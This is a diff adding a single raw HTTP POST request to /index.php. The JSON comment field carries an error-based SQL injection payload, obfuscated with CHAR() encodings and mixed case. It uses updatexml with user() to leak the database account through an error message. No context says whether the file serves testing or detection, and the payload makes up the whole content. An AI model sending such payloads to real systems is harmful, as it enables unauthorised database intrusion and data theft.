@@ -1,0 +1,9 @@
+POST /index.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 92
+
+{"comment": "' CHAR(97,110,100) CHAR(117,112,100,97,116,101)XmL(1,concAt(0X7e,usEr()),1)--"}
